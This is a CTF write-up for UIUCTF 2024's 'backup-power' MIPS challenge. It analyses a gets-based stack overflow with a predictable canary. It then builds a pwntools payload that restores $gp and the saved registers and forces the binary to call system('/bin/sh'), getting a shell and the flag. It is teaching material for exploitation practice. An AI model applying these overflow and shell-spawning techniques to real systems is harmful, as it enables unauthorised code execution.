# UIUCTF 2024

## pwn/backup-power

## Introduction

The challenge provides a binary [backup-power](backup-power) and a [Dockerfile](Dockerfile). On running `file` command, we get to know that the binary is:

- MIPS 32-bit
- Big endian
- statically-linked (no worries about finding a MIPS32 ld and libc)

```
$ file backup-power
backup-power: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, BuildID[sha1]=f35027e73bc1014a42a60288b446b1dedca772fb, for GNU/Linux 3.2.0, with debug_info, not stripped
```

On running `checksec`, we find out that the binary has a `stack canary` (which aids against buffer overflow), and has `PIE` disabled (so the addresses at runtime are the same as that we see with a disassembler).

```sh
$ checksec backup-power
    Arch:     mips-32-big
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

## Running the executable

A quick google search on how to run and debug a MIPS executable, gives a [Stack Exchange](https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain) link.
On running it, we are greeted with a screen, which asks for a Username, followed by a Password, and a Command.

```sh
===========================
= BACKUP POWER MANAGEMENT =
============================
SIGPwny Transit Authority Backup power status: disabled
Username: admin
Username is admin
Password: admin
Command: admin
Invalid command
```

We write a basic `pwntools` script in order to analyse and exploit the binary.

```py
from pwn import *

context.binary = ELF("./backup-power", checksec=False)
p = gdb.debug(context.binary.path)
```

## Preliminary Analysis

For this writeup, I am using ghidra for static analysis. On importing the binary in ghidra, we notice that there are two functions of our interest, namely `main` and `develper_power_management_portal`.
In `main`, the variables of our interest are:

```c
char username [100];
char password [100];
char command [100];
char command_buf [128];
char shutdown [9] = "shutdown";
char shutup [7] = "shutup";
char system_str [7] = "system";
char arg1 [32];
char arg2 [32];
char arg3 [32];
char arg4 [32];
char *allowed_commands [2];
allowed_commands[0] = shutdown;
allowed_commands[1] = shutup
```

There is a do-while loop, with a while loop nested inside (both run infinitely). We analyse the code piece-by-piece.

```c
do {
  while( true ) {
    printf("SIGPwny Transit Authority Backup power status: %s\n",backup_power);
    printf("Username: ");
    fgets(username,100,(FILE *)stdin);
    sVar6 = strcspn(username,"\n");
    username[sVar6] = '\0';
    printf("Username is %s\n",username);
    iVar7 = strcmp(username,"devolper");
    uVar5 = arg4._0_4_;
    uVar4 = arg3._0_4_;
    uVar3 = arg2._0_4_;
    uVar2 = arg1._0_4_;
    if (iVar7 == 0) break;
    printf("Password: ");
    fgets(password,100,(FILE *)stdin);
    printf("Command: ");
    fgets(command,100,(FILE *)stdin);
    sVar6 = strcspn(command,"\n");
    command[sVar6] = '\0';
    bVar1 = false;
    for (i = 0; i < 2; i = i + 1) {
      iVar7 = strcmp(command,allowed_commands[i]);
      if (iVar7 == 0) {
        bVar1 = true;
        break;
      }
    }
    if (!bVar1) {
      puts("Invalid command");
      return 0;
    }
```

If the username entered is not `devolper`, it asks for a password, and a command, and if the command is not in allowed_commands (which contains `shutdown` and `shutup`), then the program returns.
If the username entered is `devolper`, it breaks out of the inner loop.

```c
LAB_00400c9c:
      iVar7 = strcmp(command,shutdown);
      if (iVar7 == 0) {
        backup_power = "disabled";
      }
      else {
        iVar7 = strcmp(command,shutup);
        if (iVar7 == 0) {
          backup_power = "enabled";
        }
        else {
          iVar7 = strcmp(command,system_str);
          if (iVar7 == 0) {
            sprintf(command_buf,"%s %s %s %s",arg1,arg2,arg3,arg4);
            system(command_buf);
            return 0;
          }
          iVar7 = strcmp(command,"todo");
          if (iVar7 != 0) {
            puts("We got here 3");
            return 0;
          }
          puts("Only developers should see this");
        }
      }
```

This can be simplified to a `switch-case` as follows:

```c
LAB_00400c9c:
switch (command) {
  case shutdown:
    backup_power = "disabled";
    break;
  case shutup:
    backup_power = "enabled";
    break;
  case system_str:
    sprintf(command_buf,"%s %s %s %s",arg1,arg2,arg3,arg4);
    system(command_buf);
    break;
  case "todo":
    puts("We got here 3");
    return 0;
};
```

So, if the string `command` is equal to the string `system_str`, we can run `system(arg1 arg2 arg3 arg4)`.
We proceed with further analysis outside the inner while loop (where we reach when username is `devolper`).

```c
command = "todo";
develper_power_management_portal(in_stack_fffffd68);
arg1._0_4_ = uVar2;
arg2._0_4_ = uVar3;
arg3._0_4_ = uVar4;
arg4._0_4_ = uVar5;
goto LAB_00400c9c;
```

This sets the command to `todo`, runs `develper_power_management_portal`, and goes to `LAB_00400c9c` which would simply return if the command is left as `todo`.
Now, we analyse `develper_power_management_portal` function, which may be the key to solve this challenge.

```c
void develper_power_management_portal(int cfi)

{
  int in_a0;
  int unaff_retaddr;
  char buffer [4];

  gets(buffer);
  if (unaff_retaddr != in_a0) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

It is a small function with a buffer overflow vulnerability since it uses `gets`, but it also has a stack canary. The stack canary is simply the `return adrress` of this function and since `PIE` is disabled, its value is the same every time and is equal to `0x400b0c`, as we see from the disassembly.

```asm
        00400b04 0c 10 03 8e     jal        develper_power_management_portal
        00400b08 00 00 00 00     _nop
        00400b0c 8f dc 00 18     lw         gp,0x18(s8)
```

In ghidra, we can see the stack layout of `develper_power_management_portal` (omitted some lines for simplicity).

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             void develper_power_management_portal(int cfi)
             void              <VOID>         <RETURN>
             int               Stack[0x0]:4   cfi                                     XREF[1]:     00400e70(W)
                               ...
             char[4]           Stack[-0x30]:4 buffer
             undefined4        Stack[-0x38]:4 local_38                                XREF[3]:     00400e6c(W),
                                                                                                   00400e94(R),
                                                                                                   00400ebc(R)
                             develper_power_management_portal                XREF[3]:     Entry Point(*), 00400b04(c),
                                                                                          .debug_frame::00000040(*)
        00400e38 27 bd ff b8     addiu      sp,sp,-0x48
```

From here onwards, `sp` stands for the value of `$sp` in `develper_power_management_portal` function, and `s8` stands for the value of `$s8` in `main` function.

- The first instruction subtracts `0x48` from `$sp`.
- Then the stack pointer in `main` is `sp+0x48`.
- The buffer which is vulnerable is at `$buffer = sp+0x48-0x30 = sp+0x18`.
- The stack canary that we wish to preserve is at `sp+0x48-0x4 = $buffer+0x2c`.

The stack layout of `main` is as follows (omitted some lines for simplicity):

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             int main(void)
                               assume gp = 0x4aa330
             int               v0:4           <RETURN>
                               ...
             char[32]          Stack[-0x40]   arg4
             char[32]          Stack[-0x60]   arg3
             char[32]          Stack[-0x80]   arg2
             char[32]          Stack[-0xa0]   arg1
             char[7]           Stack[-0xa8]:7 system_str
             char[7]           Stack[-0xb0]:7 shutup
             char[9]           Stack[-0xbc]:9 shutdown
             char[128]         Stack[-0x13c   command_buf
             char[100]         Stack[-0x1a0   command
                               ...
                             main                                            XREF[4]:     Entry Point(*),
                                                                                          __start:004005cc(*), 004a2348(*),
                                                                                          .debug_frame::00000018(*)
        004007b0 27 bd fd 68     addiu      sp,sp,-0x298
                                 ...
        004007bc 03 a0 f0 25     or         s8,sp,zero
```

We make the following observations:

- `$gp = 0x4aa330`.
- `s8` is equal to `$sp in main`, i.e., `sp+0x48`.
- `command` is at `(sp+0x48)+0x298-0x1a0 = $buffer+0x128`.
- `system_str` is at `(sp+0x48)+0x298-0xa8 = $buffer+0x220`.
- `arg1` is at `(sp+0x48)+0x298-0xa0 = $buffer+0x228`.

Our strategy is to make `command` equal to `system_str`, and `arg1` equal to `"/bin/sh"`. So that the program calls `system("/bin/sh")`.

## Exploit

We can exploit the buffer overflow vulnerability in `develper_power_management_portal`. A payload like the one below can be used.

```py
p.recvuntil(b"Username: ")
p.sendline(b"devolper")
p.recvuntil(b"devolper\n")

payload = (
    b"A" * 0x2c  # fill till stack canary
    + p32(0x400B0C)  # write the stack canary (upto $buffer+0x30)
    + b"B" * (0x128 - 0x30)  # fill till command
    + b"system\x00"  # write the command (upto $buffer+0x12f)
    + b"C" * (0x220 - 0x12f)  # fill till system_str
    + b"system\x00"  # write the system_str (upto $buffer+0x227)
    + b"D"  # fill till arg1
    + b"/bin/sh\x00"  # write arg1 (upto $buffer+0x230)
)
p.sendline(payload)
p.interactive()
```

We update send this to the program using our `pwntools` script. But, it segfaults.
Upon debugging, we find that it is because `$gp` gets overwritten to `0x42424242` because of the instruction at `0x400b0c` in `main`.

```asm
        00400b0c 8f dc 00 18     lw         gp,0x18(s8)
```

We need to ensure, that `s8+0x18 = sp+0x48+0x18 = $buffer+0x48` is equal to `0x4aa330`.
We update the payload accordingly.

```py
payload = (
    b"A" * 0x2c  # fill till stack canary
    + p32(0x400B0C)  # write the stack canary (upto $buffer+0x30)
    + b"B" * (0x48 - 0x30)  # fill till $gp
    + p32(0x4AA330)  # write $gp (upto $buffer+0x4c)
    + b"C" * (0x128 - 0x4c)  # fill till command
    + b"system\x00"  # write the command (upto $buffer+0x12f)
    + b"D" * (0x220 - 0x12f)  # fill till system_str
    + b"system\x00"  # write the system_str (upto $buffer+0x227)
    + b"E"  # fill till arg1
    + b"/bin/sh\x00"  # write arg1 (upto $buffer+0x230)
)
```

But we run into one more issue.

```sh
sh: 1: AAAA/sh: not found
```

The arguments to `system` get corrupted, because in `develper_power_management_portal` the `s` registers are given values loaded from the stack, and in `main`, values from `s` registers are stored onto the stack.
<br>
The value of `arg1` becomes `"AAAA/sh"`. The value of `arg2`, `arg3`, `arg4` becomes `"AAAA"`.
We desire arguments other than `arg1` to be empty string, i.e., `\x00`, so a simple solution is to replace all `"A"` with `"\x00"` in the payload.

```asm
        00400b1c af d4 01 f8     sw         s4,0x1f8(s8)
```

The above instruction stores `$s4` at `s8+0x1f8 = sp+0x240 = $buffer+0x228`, which is same as `arg1`.
So, we must ensure that `$s4` is equal to `/bin`.

```asm
        00400ed8 8f b4 00 30     lw         s4,0x30(sp)
```

The above instruction loads `$s4` from `sp+0x30 = $buffer+0x18`. So, we modify our payload accordingly.

```py
payload = (
    b"\x00" * 0x18  # fill till $s4
    + b"/bin"  # write $s4 (upto $buffer+0x1c)
    + b"\x00" * (0x2c - 0x1c)  # fill till stack canary
    + p32(0x400B0C)  # write the stack canary (upto $buffer+0x30)
    + b"B" * (0x48 - 0x30)  # fill till $gp
    + p32(0x4AA330)  # write $gp (upto $buffer+0x4c)
    + b"C" * (0x128 - 0x4c)  # fill till command
    + b"system\x00"  # write the command (upto $buffer+0x12f)
    + b"D" * (0x220 - 0x12f)  # fill till system_str
    + b"system\x00"  # write the system_str (upto $buffer+0x227)
    + b"E"  # fill till arg1
    + b"/bin/sh\x00"  # write arg1 (upto $buffer+0x230)
)
```

And this does the job. We get a shell.

```sh
[+] Opening connection to backup-power.chal.uiuc.tf on port 1337: Done
[*] Switching to interactive mode
$ ls
Makefile
backup-power
backup-power.c
flag.txt
$ cat flag.txt
uiuctf{backup_p0wer_not_r3gisters}
```

The final exploit script is [solve.py](solve.py).
